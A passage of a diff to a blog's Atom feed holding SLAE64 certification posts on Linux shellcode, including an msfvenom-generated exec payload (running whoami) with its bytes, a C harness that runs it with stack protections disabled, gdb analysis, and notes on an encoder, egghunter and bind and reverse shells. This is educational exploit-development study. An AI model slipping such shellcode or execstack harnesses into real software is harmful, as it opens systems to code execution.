+&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 5.2/7 assignment is to analyse at least 3 shellcode examples created using Msfpayload for linux/x86_64. Since msfpayload is outdated, I used msfvenom instead. The analysis of the shellcodes is carried out using the gdb debugger and 2/3 shellcode analysed in this article is the shell_bind_tcp payload.</summary></entry><entry><title type="html">Msfvenom generated Exec shellcode analysis - exec shellcode</title><link href="http://localhost:4000/blog/2019-05-01-blog-SLAE51/" rel="alternate" type="text/html" title="Msfvenom generated Exec shellcode analysis - exec shellcode" /><published>2019-05-01T00:00:00+03:00</published><updated>2019-05-01T00:00:00+03:00</updated><id>http://localhost:4000/blog/blog-SLAE51</id><content type="html" xml:base="http://localhost:4000/blog/2019-05-01-blog-SLAE51/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 5.1/7 assignment is to analyse at least 3 shellcode examples created using Msfpayload for linux/x86_64. Since msfpayload is outdated, I used msfvenom instead. The analysis of the shellcodes is carried out using the gdb debugger and 1/3 shellcode analysed in this article is the linux/x64/exec payload.&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
+
+&lt;h3 id=&quot;msfvenom-generated-linuxx64exec-payload&quot;&gt;MSFvenom generated linux/x64/exec payload&lt;/h3&gt;
+
+&lt;p&gt;The first payload I chose is the linux/x64/exec payload, which is used to execute an arbitrary command which I have specified in the CMD commandline argument. In order to generate the payload I used the following command:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# msfvenom -p linux/x64/exec -f c CMD=whoami
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 46 bytes
+Final size of c file: 220 bytes
+unsigned char buf[] =
+&quot;\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53&quot;
+&quot;\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x07\x00&quot;
+&quot;\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x56\x57\x48\x89\xe6\x0f&quot;
+&quot;\x05&quot;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;shellcode-test-program&quot;&gt;Shellcode test program&lt;/h4&gt;
+
+&lt;p&gt;In order to analyse the generated payload I am placing it into the C program where we will be executing the shellcode:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
+#include&amp;lt;string.h&amp;gt;
+
+unsigned char code[] = \
+&quot;\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53&quot;
+&quot;\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x07\x00&quot;
+&quot;\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x56\x57\x48\x89\xe6\x0f&quot;
+&quot;\x05&quot;;
+
+int main()
+{
+
+  printf(&quot;Shellcode Length:  %d\n&quot;, (int)strlen(code));
+        int (*ret)() = (int(*)())code;
+        ret();
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and then compile it as follows:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -m64 -fno-stack-protector -z execstack testshellcode.c -o testshellcode -no-pie
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;analysis&quot;&gt;Analysis&lt;/h3&gt;
+
+&lt;p&gt;I started the debugger &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb ./testshellcode&lt;/code&gt; and looked at the state of all the important registers just before taking the syscall - rax, rdi, rsi and rdx. From that we can construct that the syscall to be executed:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;is execve as &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; is 0x3b (59 in decimal)&lt;/li&gt;
+  &lt;li&gt;the program which will be executed is &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; as we can find it from register &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; points to an array at 0x7fffffffdc28 with 3 array elements [“/bin/sh”, “-c”, “whoami”] as array elements are layed out into memory from lower addresses to higher addresses&lt;/li&gt;
+  &lt;li&gt;we pass no environment variables to the syscall.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/msfvenom1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So the final syscall, which this shellcode will execute is in following format:&lt;br /&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;whoami&quot;, 0])&lt;/code&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 5.1/7 assignment is to analyse at least 3 shellcode examples created using Msfpayload for linux/x86_64. Since msfpayload is outdated, I used msfvenom instead. The analysis of the shellcodes is carried out using the gdb debugger and 1/3 shellcode analysed in this article is the linux/x64/exec payload.</summary></entry><entry><title type="html">Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)</title><link href="http://localhost:4000/blog/2019-02-25-blog-SLAE4/" rel="alternate" type="text/html" title="Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)" /><published>2019-02-25T00:00:00+02:00</published><updated>2019-02-25T00:00:00+02:00</updated><id>http://localhost:4000/blog/blog-SLAE4</id><content type="html" xml:base="http://localhost:4000/blog/2019-02-25-blog-SLAE4/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 4/7 assignment is to create a custom encoding scheme like shown in the course’s Insertion encoder chapter. The encoding scheme should be used on the execve-stack shellcode implemented during the course and then executed.&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
 
 &lt;h3 id=&quot;encoding-scheme&quot;&gt;Encoding scheme&lt;/h3&gt;
 
-&lt;p&gt;I decided to implement an encoding scheme where I would divide the shellcode into 4 byte chunks and reverse the byte order in all of the chunks. For that to work, I also needed to check that the number of total bytes would be divisible by 4. For this I made the check in the python program code below &lt;code class=&quot;highlighter-rouge&quot;&gt;if (length%4 != 0)&lt;/code&gt;. If it turned out that the number of bytes of the shellcoding I am using was not divisible by 4 I padded the shellcode with &lt;code class=&quot;highlighter-rouge&quot;&gt;\x90&lt;/code&gt;-s as also seen on the picture below.&lt;/p&gt;
+&lt;p&gt;I decided to implement an encoding scheme where I would divide the shellcode into 4 byte chunks and reverse the byte order in all of the chunks. For that to work, I also needed to check that the number of total bytes would be divisible by 4. For this I made the check in the python program code below &lt;code class=&quot;highlighter-rouge&quot;&gt;if (length%4 != 0)&lt;/code&gt;. If it turned out that the number of bytes of the shellcode I am using was not divisible by 4 I padded the shellcode with &lt;code class=&quot;highlighter-rouge&quot;&gt;\x90&lt;/code&gt;-s as also seen on the picture below.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/encoding.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -69,9 +625,9 @@ Output (0xXX format): 0x50,0xc0,0x31,0x48,0x62,0x2f,0xbb,0x48,0x2f,0x2f,0x6e,0x6
 0xe2,0x89,0x83,0x48,0xe6,0x89,0x05,0x0f,0x3b,0xc0
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;h3 id=&quot;go-simple---htonl&quot;&gt;Go simple - htonl()&lt;/h3&gt;
+&lt;h3 id=&quot;go-simple-or-go-home---htonl&quot;&gt;Go simple or go home - htonl()&lt;/h3&gt;
 
-&lt;p&gt;In order for this encoder scheme to be useful for us, we should also implement the decoder stub for that particular encoding. Funnily enough I thought implementing the decoder for that would be super difficult and I would need to keep note of where I am currently in the decoded hex string, where are all the &lt;code class=&quot;highlighter-rouge&quot;&gt;4th*X&lt;/code&gt; bytes and when does the hex string end, but that turned out to be wrong. One evening I was thinking of my egghunter solution where I used an &lt;code class=&quot;highlighter-rouge&quot;&gt;access&lt;/code&gt; syscall for something that it was not really intended for. That funnily brought me to &lt;code class=&quot;highlighter-rouge&quot;&gt;htonl()&lt;/code&gt; function in C which I have previously used to convert something to network byte order. BUT … it also operates on data in 4 byte chunks and reverses the byte order. How convenient! So I made a quick example with &lt;code class=&quot;highlighter-rouge&quot;&gt;htonl()&lt;/code&gt; to see what instructions it is made up of in assembly and it turned out I only needed 1 instruction &lt;code class=&quot;highlighter-rouge&quot;&gt;bswap&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;In order for this encoder scheme to be useful for us, we should also implement the decoder stub for that particular encoding. Funnily enough I thought implementing the decoder for that would be super difficult and I would need to keep note of where I am currently in the decoded hex string, where are all the &lt;code class=&quot;highlighter-rouge&quot;&gt;4th*X&lt;/code&gt; bytes and when does the hex string end, but that turned out to be wrong assumption. One evening I was thinking of my egghunter solution where I used an &lt;code class=&quot;highlighter-rouge&quot;&gt;access&lt;/code&gt; syscall for something that it was not really intended for. That funnily brought me to &lt;code class=&quot;highlighter-rouge&quot;&gt;htonl()&lt;/code&gt; function in C which I have previously used to convert something to network byte order. BECAUSE … it also operates on data in 4 byte chunks and reverses the byte order. How convenient! So I made a quick example with &lt;code class=&quot;highlighter-rouge&quot;&gt;htonl()&lt;/code&gt; to see what instructions it is made up of in assembly and it turned out I only needed 1 instruction &lt;code class=&quot;highlighter-rouge&quot;&gt;bswap&lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt;&lt;b&gt;htonl.c example&lt;/b&gt;:&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//$ gcc htonl.c -o htonl
@@ -157,16 +713,23 @@ silvia
 &lt;ul&gt;
   &lt;li&gt;Encoder.py&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task4/encoder.py&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task4/encoder.py&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;Decoder.nasm: &lt;br /&gt;&lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task4/decoder.nasm&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task4/decoder.nasm&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post covers the 4/7 task of the SLAE certificate exam where we are going to create our own custom encoding scheme in order to use it with an execve-stack as shellcode. As a second step I am presenting a decoder routine for the custom encoding sceme which decodes the shellcode in memory when ran. Student ID: SLAE64 - 1594</summary></entry><entry><title type="html">Egghunter (64-bit Linux) using access() syscall</title><link href="http://localhost:4000/blog/2019-02-25-blog-SLAE3/" rel="alternate" type="text/html" title="Egghunter (64-bit Linux) using access() syscall" /><published>2019-02-25T00:00:00+02:00</published><updated>2019-02-25T00:00:00+02:00</updated><id>http://localhost:4000/blog/blog-SLAE3</id><content type="html" xml:base="http://localhost:4000/blog/2019-02-25-blog-SLAE3/">&lt;p&gt;This blog post covers the 3/7 task of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SLAE certificate exam&lt;/a&gt; where we are going to discuss what is virtual address space, virtual addresses as well as how to utilise the knowledge on that to create our very own egghunter. Let’s hunt some eggs!&lt;br /&gt;
-&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
+&lt;/ul&gt;
 
-&lt;p&gt;&lt;b&gt;Task:&lt;/b&gt;&lt;/p&gt;
+&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;Study	about the Egg Hunter shellcode&lt;/li&gt;
-  &lt;li&gt;Create a working demo of the Egghunter&lt;/li&gt;
-  &lt;li&gt;Should be configurable for different payloads&lt;/li&gt;
-&lt;/ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 4/7 assignment is to create a custom encoding scheme like shown in the course’s Insertion encoder chapter. The encoding scheme should be used on the execve-stack shellcode implemented during the course and then executed.</summary></entry><entry><title type="html">Egghunter (64-bit Linux) using access() syscall</title><link href="http://localhost:4000/blog/2019-02-25-blog-SLAE3/" rel="alternate" type="text/html" title="Egghunter (64-bit Linux) using access() syscall" /><published>2019-02-25T00:00:00+02:00</published><updated>2019-02-25T00:00:00+02:00</updated><id>http://localhost:4000/blog/blog-SLAE3</id><content type="html" xml:base="http://localhost:4000/blog/2019-02-25-blog-SLAE3/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 3/7 assignment is to study about egg hunters and to create a working demo. So in this article I will give an overview of virtual address space, virtual addresses and how to utilize that knowledge on creating an egghunter. So let’s hunt some eggs.&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
 
 &lt;h2 id=&quot;what-is-an-egghunter&quot;&gt;What is an egghunter&lt;/h2&gt;
 
@@ -348,17 +911,23 @@ execve(&quot;/bin//sh&quot;, NULL, NULL)          = 0
 &lt;ul&gt;
   &lt;li&gt;Egghunter.nasm: &lt;br /&gt;&lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task3/egghunter.nasm&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task3/egghunter.nasm&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;Shellcode.c used for testing:&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task3/shellcode.c&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task3/shellcode.c&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post covers the 3/7 task of the SLAE certificate exam where we are going to discuss what is virtual address space, virtual addresses as well as how to utilise the knowledge on that to create our very own egghunter. Let’s hunt some eggs! Student ID: SLAE64 - 1594</summary></entry><entry><title type="html">64-bit reverse shell with passphrase protection</title><link href="http://localhost:4000/blog/2019-01-25-blog-SLAE2/" rel="alternate" type="text/html" title="64-bit reverse shell with passphrase protection" /><published>2019-01-25T00:00:00+02:00</published><updated>2019-01-25T00:00:00+02:00</updated><id>http://localhost:4000/blog/blog-SLAE2</id><content type="html" xml:base="http://localhost:4000/blog/2019-01-25-blog-SLAE2/">&lt;p&gt;This blog post covers the 2/7 task of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SLAE certificate exam&lt;/a&gt; which requires a 64-bit reverse shellcode. To establish a connection user is asked to submit the correct passphrase.&lt;br /&gt;
-&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
+&lt;/ul&gt;
 
-&lt;p&gt;&lt;b&gt;Task - &lt;/b&gt; Create a reverse TCP shellcode which:&lt;/p&gt;
+&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;reverse connects to configured IP and Port&lt;/li&gt;
-  &lt;li&gt;needs a “passcode”&lt;/li&gt;
-  &lt;li&gt;if passcode is entered correctly then executes shell&lt;/li&gt;
-  &lt;li&gt;remove all 0x00 bytes from the bind TCP shellcode&lt;/li&gt;
-&lt;/ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 3/7 assignment is to study about egg hunters and to create a working demo. So in this article I will give an overview of virtual address space, virtual addresses and how to utilize that knowledge on creating an egghunter. So let’s hunt some eggs.</summary></entry><entry><title type="html">64-bit reverse shell with passphrase protection</title><link href="http://localhost:4000/blog/2019-01-25-blog-SLAE2/" rel="alternate" type="text/html" title="64-bit reverse shell with passphrase protection" /><published>2019-01-25T00:00:00+02:00</published><updated>2019-01-25T00:00:00+02:00</updated><id>http://localhost:4000/blog/blog-SLAE2</id><content type="html" xml:base="http://localhost:4000/blog/2019-01-25-blog-SLAE2/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 2/7 assignment is to create a 64-bit reverse shellcode with passphrase protection. If passphrase is entered correctly, only then the shell gets executed. All 0-bytes should be removed.&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
 
 &lt;h2 id=&quot;reverse-shellcode&quot;&gt;Reverse shellcode&lt;/h2&gt;
 
@@ -642,17 +1211,23 @@ bzero(&amp;amp;server.sin_zero, 8) = 8 bytes
 &lt;ul&gt;
   &lt;li&gt;Full assembly code can be found at:&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task2/reverseshell.nasm&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task2/reverseshell.nasm&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;Full C code:&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task2/reverseshell.c&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task2/reverseshell.c&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post covers the 2/7 task of the SLAE certificate exam which requires a 64-bit reverse shellcode. To establish a connection user is asked to submit the correct passphrase. Student ID: SLAE64 - 1594</summary></entry><entry><title type="html">64-bit bindshell with a passphrase protection</title><link href="http://localhost:4000/blog/2019-01-15-blog-SLAE1/" rel="alternate" type="text/html" title="64-bit bindshell with a passphrase protection" /><published>2019-01-15T00:00:00+02:00</published><updated>2019-01-15T00:00:00+02:00</updated><id>http://localhost:4000/blog/blog-SLAE1</id><content type="html" xml:base="http://localhost:4000/blog/2019-01-15-blog-SLAE1/">&lt;p&gt;This blog post covers the 1/7 task of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SLAE certificate exam&lt;/a&gt; of creating a 64-bit bindshell which has a check if the correct passphrase is entered upon establishing the connection.&lt;br /&gt;
-&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
+&lt;/ul&gt;
 
-&lt;p&gt;&lt;b&gt;Task - &lt;/b&gt; Create a bind TCP shellcode which:&lt;/p&gt;
+&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;binds to a port&lt;/li&gt;
-  &lt;li&gt;needs a “passcode”&lt;/li&gt;
-  &lt;li&gt;if passcode is entered correctly then executes shell&lt;/li&gt;
-  &lt;li&gt;remove all 0x00 bytes from the bind TCP shellcode&lt;/li&gt;
-&lt;/ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 2/7 assignment is to create a 64-bit reverse shellcode with passphrase protection. If passphrase is entered correctly, only then the shell gets executed. All 0-bytes should be removed.</summary></entry><entry><title type="html">64-bit bindshell with a passphrase protection</title><link href="http://localhost:4000/blog/2019-01-15-blog-SLAE1/" rel="alternate" type="text/html" title="64-bit bindshell with a passphrase protection" /><published>2019-01-15T00:00:00+02:00</published><updated>2019-01-15T00:00:00+02:00</updated><id>http://localhost:4000/blog/blog-SLAE1</id><content type="html" xml:base="http://localhost:4000/blog/2019-01-15-blog-SLAE1/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 1/7 assignment is to create a 64-bit bindshell with a password protection. If the password is entered correctly, only then the shell gets executed. All 0-bytes should be removed.&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
 
 &lt;h2 id=&quot;how-does-bind-shellcode-look-like-in-c&quot;&gt;How does bind shellcode look like in C?&lt;/h2&gt;
 
@@ -1025,7 +1600,21 @@ bzero(&amp;amp;server.sin_zero, 8) = 8 bytes
 &lt;ul&gt;
   &lt;li&gt;Full assembly code can be found at:&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task1/bindshell.nasm&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task1/bindshell.nasm&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;Full C code:&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task1/bindshell.c&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task1/bindshell.c&lt;/a&gt;&lt;/li&gt;
